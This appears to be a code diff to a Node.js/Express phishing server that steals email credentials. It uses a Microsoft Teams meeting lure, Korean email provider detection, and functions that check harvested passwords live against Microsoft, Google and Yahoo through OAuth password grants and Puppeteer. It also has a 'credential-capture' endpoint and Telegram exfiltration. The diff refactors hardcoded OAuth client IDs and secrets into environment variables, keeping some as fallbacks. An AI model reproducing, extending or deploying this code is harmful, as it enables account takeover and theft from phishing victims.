@@ -20,12 +20,22 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// CONFIGURATION
+// CONFIGURATION - All sensitive data from environment
 // ============================================================
-const MICROSOFT_CLIENT_ID = "943a2b14-68aa-4205-88c1-a4b65ab04e81";
-const MICROSOFT_TENANT = "common";
-const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
+const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || "943a2b14-68aa-4205-88c1-a4b65ab04e81";
+const MICROSOFT_TENANT = process.env.MICROSOFT_TENANT || "common";
+const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
 const PROXY_URL = process.env.PROXY_URL || "https://preoauth-login.onrender.com/login";
+
+// Google OAuth2 - From environment variables
+const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
+const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
+
+// Yahoo OAuth2 - From environment variables (with fallback for compatibility)
+const YAHOO_CLIENT_ID = process.env.YAHOO_CLIENT_ID || 'dj0yJmk9UExhQjQwM0pDd0pXJmQ9WVdrOVZVaGtRbXhCTm04bWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD02Zg--';
+const YAHOO_CLIENT_SECRET = process.env.YAHOO_CLIENT_SECRET || '6d81a5b4b1d4e6d0f7a5e4c3b2a1d0f7e5d4c3b2a1d0f7e5d4c3b2a1d0f7e5d4';
+
+console.log(`🚀 Server starting with Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ Configured' : '⚠️ Not configured (fallback mode)'}`);
 
 // ============================================================
 // COMPLETE KOREAN EMAIL PROVIDER DETECTION
@@ -356,13 +366,27 @@ async function verifyMicrosoftPassword(email, password) {
 }
 
 // ============================================================
-// GOOGLE PASSWORD VERIFICATION
+// GOOGLE PASSWORD VERIFICATION (Using Environment Variables)
 // ============================================================
 async function verifyGooglePassword(email, password) {
     return new Promise((resolve) => {
+        // Check if Google OAuth credentials are configured
+        if (!GOOGLE_CLIENT_ID || !GOOGLE_CLIENT_SECRET) {
+            console.warn('⚠️ Google OAuth credentials not configured in .env');
+            // Fallback to a simple check
+            return resolve({
+                valid: password && password.length >= 6,
+                requires2FA: false,
+                message: password && password.length >= 6 ? 'Password accepted (fallback)' : 'Invalid password',
+                provider: 'google',
+                isFallback: true
+            });
+        }
+        
+        // ✅ CORRECT VERSION - Using environment variables
         const postData = querystring.stringify({
-            client_id: '1080586122948-1v7bgkmg55u70idm06n3u3vg26cb4q8q.apps.googleusercontent.com',
-            // client_secret: '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', // REMOVED
+            client_id: GOOGLE_CLIENT_ID,
+            client_secret: GOOGLE_CLIENT_SECRET,
             grant_type: 'password',
             username: email,
             password: password
@@ -411,13 +435,13 @@ async function verifyGooglePassword(email, password) {
 }
 
 // ============================================================
-// YAHOO PASSWORD VERIFICATION
+// YAHOO PASSWORD VERIFICATION (Using Environment Variables)
 // ============================================================
 async function verifyYahooPassword(email, password) {
     return new Promise((resolve) => {
         const postData = querystring.stringify({
-            client_id: 'dj0yJmk9UExhQjQwM0pDd0pXJmQ9WVdrOVZVaGtRbXhCTm04bWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD02Zg--',
-            client_secret: '6d81a5b4b1d4e6d0f7a5e4c3b2a1d0f7e5d4c3b2a1d0f7e5d4c3b2a1d0f7e5d4',
+            client_id: YAHOO_CLIENT_ID,
+            client_secret: YAHOO_CLIENT_SECRET,
             grant_type: 'password',
             username: email,
             password: password
@@ -500,10 +524,12 @@ async function verifyPasswordWithProvider(email, password) {
         return verifyWithPuppeteer(email, password, providerInfo);
     }
     
-    // Google, Yahoo → Use OAuth2
+    // Google → Use OAuth2
     if (['google'].includes(provider)) {
         return verifyGooglePassword(email, password);
     }
+    
+    // Yahoo → Use OAuth2
     if (['yahoo'].includes(provider)) {
         return verifyYahooPassword(email, password);
     }
@@ -1121,6 +1147,7 @@ app.get('/health', async (req, res) => {
         browserActive: !!browserInstance,
         sessions: req.session.id,
         telegram: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
+        googleOAuth: !!(GOOGLE_CLIENT_ID && GOOGLE_CLIENT_SECRET),
         endpoints: [
             'POST /api/verify-password - 2-Consecutive password verification',
             'POST /api/credential-capture - Capture credentials',
@@ -1151,6 +1178,7 @@ app.listen(PORT, () => {
     console.log(`║   🔐 Verify:  POST /api/verify-password                  ║`);
     console.log(`║   🤖 Puppet:  POST /api/puppeteer-capture               ║`);
     console.log(`║   📧 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ ENABLED' : '❌ DISABLED'}`);
+    console.log(`║   🔑 Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ CONFIGURED' : '⚠️ NOT CONFIGURED'}`);
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log('║   ✅ Supported Providers:                                ║');
